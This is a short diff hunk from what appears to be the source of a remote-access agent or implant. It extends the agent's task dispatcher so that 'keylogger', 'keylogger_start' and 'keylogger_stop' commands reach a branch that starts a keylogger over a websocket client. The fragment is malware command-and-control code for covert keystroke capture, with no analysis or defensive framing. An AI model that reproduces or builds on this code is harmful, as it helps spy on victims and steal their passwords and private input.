@@ -3317,7 +3317,7 @@ class Agent:
                         "action": "stop"
                     }}
 
-            if task_type == "keylogger":
+            if task_type in ["keylogger", "keylogger_start", "keylogger_stop"]:
                 action = task.get("action") or task.get("data", {{}}).get("action")
                 if action == "start":
                     if not hasattr(self, 'keylogger_ws_client') or not self.keylogger_ws_client or not self.keylogger_ws_client.connected:
